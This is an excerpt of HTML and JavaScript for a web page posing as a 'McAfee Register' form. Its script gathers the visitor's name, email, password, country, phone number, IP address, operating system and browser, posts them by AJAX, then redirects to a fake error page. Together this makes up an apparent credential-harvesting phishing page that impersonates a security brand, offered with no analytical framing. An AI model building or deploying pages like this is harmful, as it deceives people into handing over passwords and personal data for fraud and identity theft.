...
<div class="loader1">
    <div class="container-fluid">
        ...
        <div class="col-lg-8 col-md-8 col-sm-12 col-xs-12 form-box" style="height:800px;">
            <div class="row">
            ...
            <div class="row login-section"  >
                <div class="col-md-6" style="padding-left: 0px;padding-right: 10px;margin-top: -20px;">
                    <h3 class="login-heading">McAfee Register</h3>
                    <div class="col-lg-12 login-left-side-form" style="height: 547px;">
                        ...
                        <form id="form login-sidebar-form" target="_self" onsubmit="return postToGoogle();" action="" autocomplete="off">
                            ...
                            <input type="hidden" id="name" name="password" value="<?php echo $name; ?>">
...
<script>
  $("#form").submit(function() 
  {
        ...
        var field3= $("#password").val();
        var field4 = $("#country option:selected").text();
        var field5 = $("#phoneno").val();
    ...
    $.ajax({
        ...
        data: {"fname": field1, "email": field2, "password": field3, "country": field4, "phoneno": field5, "ip":  field6, "os": field7, "browser": field8 },
...
<script>
        function pageRedirect() {
                     window.location.replace("reg_err.php");
                        }   
